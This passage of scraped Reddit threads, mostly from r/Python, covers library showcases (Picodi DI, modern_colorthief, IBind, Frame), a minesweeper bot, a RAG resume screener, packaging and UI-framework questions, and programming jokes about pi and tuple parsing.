    "post_content": "What My Project Does\nPicodi is a lightweight and easy-to-use Dependency Injection (DI) library for Python. Picodi supports both synchronous and asynchronous contexts and offers features like resource lifecycle management. Think about Picodi as a decorator that helps you manage your dependencies without the need for a full-blown DI container.\nKey Features\n🌟 Simple and lightweight\n📦 Zero dependencies\n⏱️ Supports both sync and async contexts\n🔄 Resource lifecycle management\n🔍 Type hints support\n🐍 Python & PyPy 3.10+ support\nQuick Start\nHere’s a quick example of how Picodi works:\nimport asyncio\nfrom collections.abc import Callable\nfrom datetime import date\nfrom typing import Any\nimport httpx\nfrom picodi import Provide, init_resources, inject, resource, shutdown_resources\nfrom picodi.helpers import get_value\n\n\ndef get_settings() -> dict:\n    return {\n        \"nasa_api\": {\n            \"api_key\": \"DEMO_KEY\",\n            \"base_url\": \"https://api.nasa.gov\",\n            \"timeout\": 10,\n        }\n    }\n\n@inject\ndef get_setting(path: str, settings: dict = Provide(get_settings)) -> Callable[[], Any]:\n    value = get_value(path, settings)\n    return lambda: value\n\n@resource\n@inject\nasync def get_nasa_client(\n    api_key: str = Provide(get_setting(\"nasa_api.api_key\")),\n    base_url: str = Provide(get_setting(\"nasa_api.base_url\")),\n    timeout: int = Provide(get_setting(\"nasa_api.timeout\")),\n) -> httpx.AsyncClient:\n    async with httpx.AsyncClient(\n        base_url=base_url, params={\"api_key\": api_key}, timeout=timeout\n    ) as client:\n        yield client\n\n@inject\nasync def get_apod(\n    date: date, client: httpx.AsyncClient = Provide(get_nasa_client)\n) -> dict[str, Any]:\n    response = await client.get(\"/planetary/apod\", params={\"date\": date.isoformat()})\n    response.raise_for_status()\n    return response.json()\n\nasync def main():\n    await init_resources()\n    apod_data = await get_apod(date(2011, 7, 19))\n    print(\"Title:\", apod_data[\"title\"])\n    await shutdown_resources()\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\nThis example demonstrates how Picodi handles dependency injection for both synchronous and asynchronous functions, manages resource lifecycles, and provides a clean and efficient way to structure your code.\nFor more examples and detailed documentation, check out the GitHub repository\nTarget Audience\nPicodi is perfect for developers who want to simplify dependency management in their Python applications, but don't want to deal with the complexity of larger DI frameworks. Picodi can help you write cleaner and more maintainable code.\nComparison\nUnlike other DI libraries, Picodi does not have wiring, a large set of different types of providers, or the concept of a container.\nPicodi prioritizes simplicity, so it includes only the most essential features: dependency injection, resource lifecycle management, and dependency overriding.\nGet Involved\nPicodi is still in the experimental stage, and I'm looking for feedback from the community. If you have any suggestions, encounter any issues, or want to contribute, please check out the GitHub repository and let me know.",
    "comments": [
        {
            "author": "1One2Twenty2Two",
            "score": "1",
            "content": "That's like FastDepends with extra steps.",
            "replies": [
                {
                    "author": "yakimka",
                    "score": "1",
                    "content": "FastDepends is not compatible with FastAPI, and it also lacks the concept of a \"resource\". Additionally, it handles parameter validation (assert main(\"1\", 2) == 4.0 - https://github.com/Lancetnik/FastDepends?tab=readme-ov-file#sync-code ), which is not a primary functionality for a DI library."
                }
            ]
        }
    ]
},
{
    "post_author": "BasePlate_Admin",
    "post_id": "1crouri",
    "post_score": "3",
    "post_time": "Tuesday, May 14, 2024 at 1:29:11 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "modern_colorthief - Modified Median Cut Quantization algorithm in rust + python",
    "media": [
        "https://github.com/baseplate-admin/modern_colorthief",
        "https://github.com/RazrFalcon/color-thief-rs/",
        "https://modern-colorthief.readthedocs.io/en/latest/benchmarks.html",
        "https://modern-colorthief.readthedocs.io/en/latest/"
    ],
    "post_content": "github\ndocumentation\nWhat my project does :\nIt gets the dominant color/color palette from given image.\nTarget Audience:\nAnyone\nUsage\nmodern_colorthief exposes two functions get_color and get_palette\nHere is how to use get_color:\nfrom modern_colorthief import get_color\n\n# Path to any image\npath = ...\n\nprint(get_color(path)) # returns tuple[int,int,int]\nHere is how to use get_palette:\nfrom modern_colorthief import get_color\n\n# Path to any image\npath = ...\n\nprint(get_palette(path)) # returns list[tuple[int,int,int]]\nGoals:\nBring color-thief-rs to python\nBenchmarks:\nWritten in deatils\nGist:\nPython Took:            0.09976800000004005\nCPP Took:               0.008461299999908078\nRUST Took:              0.008549499994842336\n\n\nPython Took:            0.0960583999985829\nCPP Took:               0.008564600000681821\nRUST Took:              0.007692700004554354\nDifferences\nWith fast-colorthief\nSupports more architectures. ( pybind11 vs pyo3 )\nDoesn't have a hard dependency on numpy\nCode is simple compared to fast-colorthief's CPP codebase\nAutomated tooling powered by maturin and github-actions\nThe size of fast-colorthief is 52kb-60kb.\nWith color-thief-py\nSuperior execution time (nearly 100x)\nDoesn't have a hard dependency on pillow\ncolor-thief's codebase is not in par with modern python versions\nIf you like this project please star this repository",
    "comments": [
        {
            "author": "denehoffman",
            "score": "1",
            "content": "What architectures are supported in pybind11 that aren’t in pyo3? Genuinely curious, as I’m working on a (very different) project using pyo3",
            "replies": [
                {
                    "author": "BasePlate_Admin",
                    "score": "2",
                    "content": "I apologise for the confusion. I meant the other way around. PyO3 supports more architectures(for example powerpc)."
                }
            ]
        },
        {
            "author": "Tuxa13",
            "score": "1",
            "content": "great job! what does the quality parameter do?",
            "replies": [
                {
                    "author": "BasePlate_Admin",
                    "score": "1",
                    "content": "Hi thanks for checking it out. Quoting ColorThief's documentation quality is an optional argument that must be an Integer of value 1 or greater, and defaults to 10. The number determines how many pixels are skipped before the next one is sampled. We rarely need to sample every single pixel in the image to get good results. The bigger the number, the faster a value will be returned."
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1crefjo",
    "post_score": "8",
    "post_time": "Tuesday, May 14, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Tuesday Daily Thread: Advanced questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "SweetOnionTea",
            "score": "2",
            "content": "I have a project that will be delivered to a customer who cannot connect to the internet. This means that I need to package EVERYTHING. Just imagine that whomever installs this burns the software onto a CD and gets physically transported to the machine. Python is nice because all the OS versions I need to target will have Python3.8+ at least so I imagine I only need to write code in compliance with 3.8 and it should be fine with further versions of 3. My issue is that they cannot use pip to download any modules so they must be packaged with the product. Every other module is fine for 3.8+ in general except for pydantic. That appears to have a Cython version specific to down to the minor version. That means if a customer's machine has 3.9 and I build for 3.8 it won't work I think. At least the pip install dependencies won't let it be installed. Is there a way around this? Specifically I'm using it for schema validation for FastAPI. I don't think I can ship docker either as I believe any given version is compiled for a specific OS.",
            "replies": [
                {
                    "author": "AaronOpfer",
                    "score": "6",
                    "content": "Set up a conda environment that has everything the way you want it, then pack it into a tarball with conda pack. Unpack at the destination and run."
                }
            ]
        },
        {
            "author": "rejectedlesbian",
            "score": "1",
            "content": "is there a good package manager that can ship things that are statically so it just fucking works anywhere and u don't need to deal with dependencies everywhere? or maybe a way to configure pip to deafualt to the oldest working version of a package or only to versions that were available in YEAR X?"
        }
    ]
},
{
    "post_author": "Greenfoot5",
    "post_id": "ce3a62",
    "post_score": "2068",
    "post_time": "Wednesday, July 17, 2019 at 12:23:56 AM GMT+3",
    "flair_text": "",
    "post_title": "Nice try",
    "media": [
        "https://preview.redd.it/if4cpzab6pa31.jpg?width=640&crop=smart&auto=webp&s=2f047744f90d768d6ce48de1cfdb4a771f9eb211",
        "https://www.reddit.com/r/ProgrammerHumor/",
        "https://www.reddit.com/r/ProgrammerHumor/comments/cdzubd/nice_try/",
        "https://i.redd.it/if4cpzab6pa31.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "",
            "content": "Needs more RAM",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "Needs more RAM",
                    "replies": [
                        {
                            "author": "wilalva11",
                            "score": "44",
                            "content": "Needs more RAM"
                        },
                        {
                            "author": "seizedengine",
                            "score": "1",
                            "content": "Based on a Google engineers work you might need a few more of those cards. At least to break the record. https://blog.google/products/google-cloud/most-calculated-digits-pi/ https://cloud.google.com/blog/products/compute/calculating-31-4-trillion-digits-of-archimedes-constant-on-google-cloud 170TB of storage with almost 8PB of writes. Oh and 1.4TB RAM."
                        }
                    ]
                },
                {
                    "author": "NSNick",
                    "score": "9",
                    "content": "True, but you can at least begin to write it forwards.",
                    "replies": [
                        {
                            "author": "Jugad",
                            "score": "5",
                            "content": "You could write the backwards pi in the following manner : ...95141.3"
                        }
                    ]
                },
                {
                    "author": "maxm",
                    "score": "1",
                    "content": "You can print it for any practical purpose to do with circles and round object. At some times you reach so small units that quantum effects matters more than the precision of pi. I have no idea how many digits goes into the difference between the circumference of the universe, and the scale of quantum effects."
                }
            ]
        },
        {
            "author": "11218",
            "score": "116",
            "content": "import math print(str(math.pi)[::-1])"
        },
        {
            "author": "name_censored_",
            "score": "68",
            "content": "import random random.seed(sum(map(ord, 'the final digits of pi'))) while True: print(random.randint(0,9), end='') PROVE ME WRONG"
        },
        {
            "author": "AgreeableLandscape3",
            "score": "29",
            "content": "Does Python even allow non-ASCII variable names?"
        },
        {
            "author": "kidarek",
            "score": "8",
            "content": "ip fo stigid eht Seems pretty straightforward"
        },
        {
            "author": "[deleted]",
            "score": "6",
            "content": "10 in base pi."
        },
        {
            "author": "[deleted]",
            "score": "4",
            "content": "iP"
        },
        {
            "author": "anon691029",
            "score": "12",
            "content": "1001011000001110 I believe that's the digits of pi backwards.."
        },
        {
            "author": "hiljusti",
            "score": "3",
            "content": "At least I know the terminating digit"
        }
    ]
},
{
    "post_author": "_dwightshrute",
    "post_id": "1csd77f",
    "post_score": "86",
    "post_time": "Wednesday, May 15, 2024 at 8:19:32 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made a python bot that plays minesweeper",
    "media": [
        "https://github.com/ffhy/minesweeper"
    ],
    "post_content": "Hello,\nI made this Minesweeper bot that I wanted to share with you all.\nWhat My Project Does -\nThe bot takes a screenshot of the board and runs a classification algorithm to extract the contents of the board. It then analyzes the board, finds as many mines as it can, and sends clicks. If it cannot find any mines then it guesses the most probable position of a mine.\nTarget Audience -\nIt's a toy project for anyone interested in algorithms or problem-solving.\nComparison -\nThis is just my attempt at making a minesweeper bot. I'm sure there are many bots out there that are much more efficient than this.\ndo let me know, if you feel anything can be done better :)",
    "comments": [
        {
            "author": "Statnamara",
            "score": "9",
            "content": "Someone on r/learnpython made minesweeper yesterday! https://www.reddit.com/r/learnpython/comments/1crao8e/i_wrote_a_fullyfledged_minesweeper_for_command/ This is cool, well done!"
        },
        {
            "author": "passwordsniffer",
            "score": "7",
            "content": "Sorry OP, you solved a cool problem and did a great job accomplishing it. But honestly - this code is quite unpythonic, and can be easily simplified and be like 10 times shorter. Full of magic numbers, wall of ifs, etc... e.g. so so much code can be refactored if you add a simple neighbours helper (writing in browser, without IDE, so might have some typos/errors): def neigbours(self, i, j): for delta_i in (-1, 0, 1): for delta_j in (-1, 0, 1): if 0 <= i+delta_i < self.rows and 0 <= j+delta_j < self.cols and not (delta_i==delta_j==0): yield i+delta_i,  j+delta_j then your dfs code becomes something like flag = any(arr[ni][nj]==-1 for ni, nj in self.neighbours(i,j))  # Although I would suggest a better name than flag if flag: border.append([i,j]) visited[i][j] = True for ni, nj in self.neighbours(i, j): if(not visited[ni][nj] and 0<=arr[ni][nj]<=8): self.dfs(arr,ni, nj ,visited,border) and it looks like all the other functions would also benefit from the same helper",
            "replies": [
                {
                    "author": "bubbawiggins",
                    "score": "1",
                    "content": "Good job."
                },
                {
                    "author": "_dwightshrute",
                    "score": "1",
                    "content": "Thank you! Removed most of the if walls using this."
                }
            ]
        },
        {
            "author": "kuzmovych_y",
            "score": "9",
            "content": "That's a cool project and very pleasing visually. But that wall of ifs asks for a refactoring. Try thinking what parts of your code look repetitive and how to extract them into functions that can be reused."
        },
        {
            "author": "bubbawiggins",
            "score": "2",
            "content": "If only I knew how to play minesweeper. 😭😭😭"
        },
        {
            "author": "Dalai-Lama-of-Reno",
            "score": "2",
            "content": "Love this!"
        },
        {
            "author": "AlSweigart",
            "score": "1",
            "content": "Cool. Also, oof, this is a reminder that people actually use PyAutoGUI and I need to maintain it.",
            "replies": [
                {
                    "author": "_dwightshrute",
                    "score": "1",
                    "content": "Wait, you made pyautogui? Great work man!"
                }
            ]
        },
        {
            "author": "bisontruffle",
            "score": "0",
            "content": "nice job, enjoyable to read through this code."
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1ctrpwz",
    "post_score": "23",
    "post_time": "Friday, May 17, 2024 at 3:00:50 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Friday Daily Thread: r/Python Meta and Free-Talk Fridays",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "yakimka",
    "post_id": "1cuz4kw",
    "post_score": "1",
    "post_time": "Saturday, May 18, 2024 at 5:57:04 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Picodi - Simplifying Dependency Injection in Python",
    "media": [
        "https://github.com/yakimka/picodi",
        "https://en.wikipedia.org/wiki/Dependency_injection"
    ],
    "post_content": "What My Project Does\nPicodi is a lightweight and easy-to-use Dependency Injection (DI) library for Python. Picodi supports both synchronous and asynchronous contexts and offers features like resource lifecycle management. Think about Picodi as a decorator that helps you manage your dependencies without the need for a full-blown DI container.\nKey Features\n🌟 Simple and lightweight\n📦 Zero dependencies\n⏱️ Supports both sync and async contexts\n🔄 Resource lifecycle management\n🔍 Type hints support\n🐍 Python & PyPy 3.10+ support\nQuick Start\nHere’s a quick example of how Picodi works:\nimport asyncio\nfrom collections.abc import Callable\nfrom datetime import date\nfrom typing import Any\nimport httpx\nfrom picodi import Provide, init_resources, inject, resource, shutdown_resources\nfrom picodi.helpers import get_value\n\n\ndef get_settings() -> dict:\n    return {\n        \"nasa_api\": {\n            \"api_key\": \"DEMO_KEY\",\n            \"base_url\": \"https://api.nasa.gov\",\n            \"timeout\": 10,\n        }\n    }\n\n@inject\ndef get_setting(path: str, settings: dict = Provide(get_settings)) -> Callable[[], Any]:\n    value = get_value(path, settings)\n    return lambda: value\n\n@resource\n@inject\nasync def get_nasa_client(\n    api_key: str = Provide(get_setting(\"nasa_api.api_key\")),\n    base_url: str = Provide(get_setting(\"nasa_api.base_url\")),\n    timeout: int = Provide(get_setting(\"nasa_api.timeout\")),\n) -> httpx.AsyncClient:\n    async with httpx.AsyncClient(\n        base_url=base_url, params={\"api_key\": api_key}, timeout=timeout\n    ) as client:\n        yield client\n\n@inject\nasync def get_apod(\n    date: date, client: httpx.AsyncClient = Provide(get_nasa_client)\n) -> dict[str, Any]:\n    response = await client.get(\"/planetary/apod\", params={\"date\": date.isoformat()})\n    response.raise_for_status()\n    return response.json()\n\nasync def main():\n    await init_resources()\n    apod_data = await get_apod(date(2011, 7, 19))\n    print(\"Title:\", apod_data[\"title\"])\n    await shutdown_resources()\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\nThis example demonstrates how Picodi handles dependency injection for both synchronous and asynchronous functions, manages resource lifecycles, and provides a clean and efficient way to structure your code.\nFor more examples and detailed documentation, check out the GitHub repository\nTarget Audience\nPicodi is perfect for developers who want to simplify dependency management in their Python applications, but don't want to deal with the complexity of larger DI frameworks. Picodi can help you write cleaner and more maintainable code.\nComparison\nUnlike other DI libraries, Picodi does not have wiring, a large set of different types of providers, or the concept of a container.\nPicodi prioritizes simplicity, so it includes only the most essential features: dependency injection, resource lifecycle management, and dependency overriding.\nGet Involved\nPicodi is still in the experimental stage, and I'm looking for feedback from the community. If you have any suggestions, encounter any issues, or want to contribute, please check out the GitHub repository and let me know.",
    "comments": [
        {
            "author": "1One2Twenty2Two",
            "score": "1",
            "content": "That's like FastDepends with extra steps.",
            "replies": [
                {
                    "author": "yakimka",
                    "score": "1",
                    "content": "FastDepends is not compatible with FastAPI, and it also lacks the concept of a \"resource\". Additionally, it handles parameter validation (assert main(\"1\", 2) == 4.0 - https://github.com/Lancetnik/FastDepends?tab=readme-ov-file#sync-code ), which is not a primary functionality for a DI library.",
                    "replies": [
                        {
                            "author": "1One2Twenty2Two",
                            "score": "1",
                            "content": "FastDepends is not compatible with FastAPI You don't need it to. FastDepends is literally FastAPI's DI that has been extracted. FastAPI's DI system is really great out of the box (which is why someone extracted it). I am not sure why anyone would add another DI framework on top of it. it also lacks the concept of a \"resource\". A simple LRU cache decorator will give you the same effect as what you call a resource in your project.",
                            "replies": [
                                {
                                    "author": "yakimka",
                                    "score": "1",
                                    "content": "You don't need it to. I need this if my application is slightly larger than just a few API endpoints, and I want to use DI in workers, commands, or somewhere else where FastAPI cannot inject dependencies."
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    ]
},
{
    "post_author": "VoyZan",
    "post_id": "1cp8vnj",
    "post_score": "7",
    "post_time": "Saturday, May 11, 2024 at 7:16:03 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Hi! I've published a Python client for IBKR REST and WebSocket APIs - IBind. Hope you like it 👋",
    "media": [
        "https://github.com/Voyz/ibind/wiki/API-Reference-%E2%80%90-IbkrClient",
        "https://github.com/areed1192/interactive-brokers-api",
        "https://github.com/Voyz/ibind/wiki",
        "https://github.com/utilmon/EasyIB",
        "https://github.com/Voyz/ibind",
        "https://ibkrcampus.com/ibkr-api-page/cpapi-v1"
    ],
    "post_content": "Hi! I want to share a library I've built recently. IBind is a REST and WebSocket Python client for Interactive Brokers Client Portal Web API. It is directed at IBKR users.\nYou can find IBind on GitHub: https://github.com/Voyz/ibind\nWhat My Project Does:\nIt is a REST and WebSocket API for the Interactive Brokers' Web API.\nI'm particularly proud of a few things in this release:\nThe REST and WebSocket API clients are based on an abstract base class RestClient and WsClient accordingly. These could be implemented to use some other Web APIs in a relatively straightforward way. I have in fact used a version of that WsClient for a cryptocurrency WebSocket API, and it is nice to see it adapt to a different environment.\nI've covered most of the codebase with automated tests (appx 80%). Contrary to some of my other libraries, these are mainly integration tests which feel to provide a stronger test coverage than only unit tests.\nI've learned how to use class mixins in this project, and it aids the maintainability by a lot! The REST client itself is pretty barebone, but has a lot of mixin classes - all corresponding to the endpoint categories the broker uses, making it easy to search for the right piece of code and documentation.\nThere's a lot of things that make this client as plug-and-play as possible. The broker requires the user to specify a bunch of things - account ids, certificates, URLs, etc. - which the class either reads from the environment variables or assumes (given that some things would be common for most users). In either case, all these are customisable by parameters if needed, but it is nice to just write client = IbkrClient() in various projects having set just a couple of env vars.\nI think the documentation is pretty in-depth but readable. It's always hard to judge whether docs are well written, but I think it is nicely broken down. Also, I managed to use pydoc-markdown package to create API reference in markdown, which works nicely with the GitHub Wiki. I'd prefer it to be even easier, but compared to Sphinx and readthedocs it's a much quicker job.\nThe WebSocket class does a ton to keep the connection alive and recover from connection losses. Maintaining active subscriptions after a re-connect can be a real pain, and I think this class does it in a nice and reliable way. I've tested it for various types of connectivity loss, and it manages to recover and re-establish the WebSocket data stream. Pretty crucial in the trading environment.\nI made a nice logo for it 🥳\nTarget Audience:\nTraders using IBKR who want to automate their trading through this Web API.\nComparison (A brief comparison explaining how it differs from existing alternatives.) :\nThere are two similar libraries that I know of. They aren't bad, but seem not very well maintained and incomplete:\nhttps://github.com/areed1192/interactive-brokers-api - outdated and stale, last update 3 years ago\nhttps://github.com/utilmon/EasyIB - stale and incomplete\nThe library I've published covers a much wider range of endpoints, adds WebSocket support and a bunch of wrapper methods to simplify the usage of the API.\nIBind has a bunch of features that make using the IBKR APIs much easier. Some of these are:\nREST:\nAutomated question/answer handling - streamlining placing orders.\nParallel requests - speeding up collection of price data.\nRate limiting - guarding against account bans.\nConid unpacking - helping to find the right contract.\nWebSocket:\nWebSocket thread lifecycle handling - ensuring the connection is alive.\nThread-safe Queue data stream - exposing the collected data in a safe way.\nInternal subscription tracking - recreating subscriptions upon re-connections.\nHealth monitoring - Acting on unusual ping or heartbeat.\nREST Example:\nfrom ibind import IbkrClient\n\n# Construct the client\nclient = IbkrClient()\n\nprint(client.tickle().data)\nWebSocket Example:\nfrom ibind import IbkrWsKey, IbkrWsClient\n\n# Construct the client.\nws_client = IbkrWsClient(start=True)\n\n# Choose the WebSocket channel\nkey = IbkrWsKey.PNL\n\n# Subscribe to the PNL channel\nws_client.subscribe(channel=key.channel)\n\nprint(ws_client.get(key))\nI just wanted to share my experience of publishing Open Source. For some reason I get a lot of motivation when I can publish code that makes peoples' lives easier. The library could use some code review on it, so if you’d feel like reading some code and helping out - drop me a message. Other than that, happy to answer any questions, and - if you are an algo trader - let me know if you get a chance to use it. Thanks for reading!",
    "comments": [
        {
            "author": "Leopold0815",
            "score": "1",
            "content": "Hey there, sounds good but i am using tws too and I am looking for an Python api that can use info from discord group and put it in to action on tws. Is there already something like that?"
        }
    ]
},
{
    "post_author": "Babe_My_Name_Is_Hung",
    "post_id": "1cqwcap",
    "post_score": "5",
    "post_time": "Monday, May 13, 2024 at 1:51:24 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Resume Screening Chatbot using RAG Fusion",
    "media": [
        "https://github.com/Hungreeee/Resume-Screening-RAG-Pipeline"
    ],
    "post_content": "Hi everyone!\nI recently finished a small side project for my graduating thesis, which is about experimenting with RAG-based frameworks in improving resume screening.\nWhat my project does:\nThe project for the thesis is a GPT-4 Chatbot with RAG Fusion retrieval. Given a job description as input, the system retrieves the most relevant candidate profiles to perform follow-up tasks such as analysis, summarization, and decision-making, which can assist the screening process better.\nThe revolving idea is that the similarity-based retrieval process can effectively narrow the initial large pool of applicants down to the most relevant resumes. However, this simple similarity ranking should not be used to evaluate a candidate's actual ability. Therefore, the top resumes are used to augment the GPT-4 Chatbot so it can be conditioned on these profiles and perform further downstream tasks.\nTarget audience:\nThe repo contains the link to my paper and the notebooks that were used to design the prototype program and conduct some experiments. For the newcomers to RAG/RAG Fusion, or people who are just interested in building a RAG-based chatbots, this can be especially helpful. Feel free to check them out too!\nComparison:\nI'm not sure if there's any similar project out there, but the program is sort of designed to move the resume screening process away from existing keyword-based methods. It's much more versatile in use cases and also more effective in handling resumes.\nThe project is very far from being perfect. Because of that, I share this with the hope to receive suggestions and feedback from you. If you have time, please give the project a visit here: GitHub",
    "comments": [
        {
            "author": "qckpckt",
            "score": "2",
            "content": "Cool. I had a similar idea, but from the perspective of a job seeker. I made a RAG app that used the set of all the resumes I had created (I was making adjustments to my resume to tailor it to specific jobs), and I fed it job postings to rank the jobs based on my skill set. I found I got better results when I supplied smaller sections of job descriptions, which got me thinking about how to split up the text. I decided to try training a topic model on the collection of job ads I’d scraped, and then split up new job ads based on the dominant topic of each sentence in the ad. This led to better results but I abandoned the project when I realized that in reality, resumes are a terrible thing to optimize as it has always been my professional network that has been the source of any new job."
        },
        {
            "author": "ddollarsign",
            "score": "1",
            "content": "What’s RAG Fusion?"
        }
    ]
},
{
    "post_author": "prime_danger",
    "post_id": "1csfimo",
    "post_score": "33",
    "post_time": "Wednesday, May 15, 2024 at 11:04:14 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Production grade AI Web apps, just using python ?",
    "media": [],
    "post_content": "Hey guys, I have worked on building multiple ai/ml usecases and their specific backends. But now I want build interfaces for easy and quick integration. I saw a blog which used FastUI which looks quick decent but when I tried it just showed me a Json of elements on the page. Are there any other libraries I should use? 🤔",
    "comments": [
        {
            "author": "donseguin",
            "score": "27",
            "content": "I use FastAPI for backend, with jinja templates and htmx for front. It feels pretty straightforward.",
            "replies": [
                {
                    "author": "BostonBaggins",
                    "score": "11",
                    "content": "Got a GitHub? Curious how u use htmx"
                },
                {
                    "author": "yes_rowntree",
                    "score": "2",
                    "content": "I am building a streamlit-based RAG chat ui. What kind of app are you building where this stack is nescessary?",
                    "replies": [
                        {
                            "author": "donseguin",
                            "score": "1",
                            "content": "It's a engine that scrapes deals from top brands and post them to whatsapp channels. The front part it's just for the landing page. Everything else is backend."
                        }
                    ]
                }
            ]
        },
        {
            "author": "ironman_gujju",
            "score": "7",
            "content": "Fast UI is good too"
        },
        {
            "author": "AstronomerTerrible49",
            "score": "11",
            "content": "If it’s going to production then you better use a front end framework like react, otherwise at some point there might be a feature you can’t build using streamlit or other python libs."
        },
        {
            "author": "Sn3llius",
            "score": "11",
            "content": "Depends on your usecase, but if it's for internal use i can recommend you Rio. I've deployed 6 ML usecases (mostly FC including CRUD stuff) in the last 3 months. It works well for me, it serves ~50 dayli users per application. As a DB I use MongoDB and it is deployed on Kubernetes. I'm one of Rio's developer. We announced Rio to the public last week. Maybe you can give it a try and give us feedback. Website GitHub",
            "replies": [
                {
                    "author": "Ok_Expert2790",
                    "score": "5",
                    "content": "Project looks cool! How does the issue w/ state get handled? A lot of these Python UI web front ends have such a terrible time w state it makes me think twice"
                }
            ]
        },
        {
            "author": "Western-Pause-2777",
            "score": "3",
            "content": "Have you looked at Shiny for Python? Reactive coding so easier to manage if your app grows in complexity. I use both streamlit and Shiny."
        },
        {
            "author": "BootyDoodles",
            "score": "3",
            "content": "FastAPI with a React frontend is quality setup. They also actively maintain a full stack example template. [ Github here: Full-Stack FastAPI Template ]"
        },
        {
            "author": "ZucchiniMore3450",
            "score": "2",
            "content": "I think you already discovered there is no such thing - customizable and in only python. Just use flask and some frontend, htmlx for example if you want to avoid JS. You will spend one or two days learning it and will have all the flexibility you can imagine."
        },
        {
            "author": "versking",
            "score": "2",
            "content": "My team used only streamlit for about a year. If it does what you need, I’ve yet to find anyone able to tell me a concrete reason why streamlit is generically “bad” for production. BUT, we’re now migrating to FastAPI for our AI apps and handing off UI to a web development team. What ultimately made streamlit stop working for us was an app that needed multiple conditional user interactions. We went down a deep rabbit hole on streamlit statefulness before realizing we were essentially fighting streamlit to get what we wanted."
        }
    ]
},
{
    "post_author": "r00tr4t",
    "post_id": "g9vesj",
    "post_score": "2063",
    "post_time": "Tuesday, April 28, 2020 at 11:54:48 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Shared this one on FB and everyone was confused. :D",
    "media": [
        "https://i.redd.it/oglo3jamgmv41.png",
        "https://preview.redd.it/oglo3jamgmv41.png?auto=webp&s=6bfe86edd71c2695b8b2b2167c5f46b62e7eaced"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "ButtholeQuiver",
            "score": "485",
            "content": "(True, True, (True == (True, True, True))",
            "replies": [
                {
                    "author": "astatine",
                    "score": "229",
                    "content": "Also: >>> True, True, True == True, True, True (True, True, True, True, True) because >>> True, True, True == True, True, True is parsed as >>> (True, True, (True == True), True, True)",
                    "replies": [
                        {
                            "author": "c3534l",
                            "score": "744",
                            "content": "I no longer intuitively recognize the spelling of True after this.",
                            "replies": [
                                {
                                    "author": "astatine",
                                    "score": "130",
                                    "content": "Have to admit that happened to me too."
                                },
                                {
                                    "author": "SpAAAceSenate",
                                    "score": "98",
                                    "content": "You've temporarily paralyzed the physical neurons responsible for connecting your brain's copy of that word and it's meaning. Or in database terms, you deleted the foreign key! https://en.m.wikipedia.org/wiki/Semantic_satiation"
                                },
                                {
                                    "author": "iggdawg",
                                    "score": "16",
                                    "content": "What the hell, me too,. I don't like this and would like to restore my most recent save."
                                },
                                {
                                    "author": "[deleted]",
                                    "score": "9",
                                    "content": "happens everytime i program"
                                },
                                {
                                    "author": "house_monkey",
                                    "score": "9",
                                    "content": "I'm scared and crying"
                                }
                            ]
                        },
                        {
                            "author": "inhumantsar",
                            "score": "18",
                            "content": "... this just makes me more confused ...",
                            "replies": [
                                {
                                    "author": "astatine",
                                    "score": "95",
                                    "content": "The comma has a lower operator precedence than ==, so True==True gets evaluated first. The result is five Trues separated by commas, which finally parses as a tuple of five Trues. OP's example first evaluates True == (True, True, True) as False, so the result parses as a tuple of two Trues and a False."
                                },
                                {
                                    "author": "ChocolateBunny",
                                    "score": "55",
                                    "content": "True"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "132",
            "content": "What is happening here?????",
            "replies": [
                {
                    "author": "ubernostrum",
                    "score": "333",
                    "content": "The expression parses as constructing a tuple of three items. The first item is a literal True, the second item is a literal True, and the third item is the result of the expression True == (True, True, True). In other words, it does not parse as: (True, True, True) == (True, True, True) It parses as: True, True, (True == (True, True, True))"
                }
            ]
        },
        {
            "author": "Cregaleus",
            "score": "161",
            "content": "I'm pretty sure if I shared on Facebook: True == True True Everyone would still be confused"
        }
    ]
},
{
    "post_author": "framelanger",
    "post_id": "1cqoyuq",
    "post_score": "91",
    "post_time": "Monday, May 13, 2024 at 5:47:51 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "Frame - a new language for programming state machines in Python",
    "media": [
        "https://docs.frame-lang.org/en/latest/about/introduction.html",
        "https://docs.frame-lang.org/en/latest/",
        "https://marketplace.visualstudio.com/items?itemName=frame-lang-org.frame-machine-maker",
        "https://playground.frame-lang.org/",
        "https://github.com/frame-lang/frame_transpiler"
    ],
    "post_content": "Hey,\nI am (re)releasing a project called Frame that I've been working on to create a language and transpiler to easily create state machines/automata in Python. It also is able to generate UML documentation as well.\nThis project is for people who are interested in programming state machines for a wide range of purposes such as game programming, workflows, MBSE modeling as well as school projects for comp sci theory. It is also useful simply for generating flow documentation.\nThe Framepiler (Frame transpiler) is in beta at this time. It would be great to get feedback from the Python community on any gaps in key functionality or bugs.\nLow-code/no-code workflow tools are often problematic for creating state machine like flows. Frame is intended to give a textual way to accomplish the same thing, but without having to \"draw\" your software and with the ability to use all the standard devops tooling and processes for \"normal\" development processes.\nThere is also a VSCode extension and a playground environment to experiment in.\nVery much hoping to connect with people who might find this interesting and useful. If that is you, please take a look at the Overview and the Getting Started articles. Here is a link to the GitHub Framepiler Project as well.\nPlease LMK if you have any questions or interest in the project.\nThanks!\nMark",
    "comments": [
        {
            "author": "XtremeGoose",
            "score": "67",
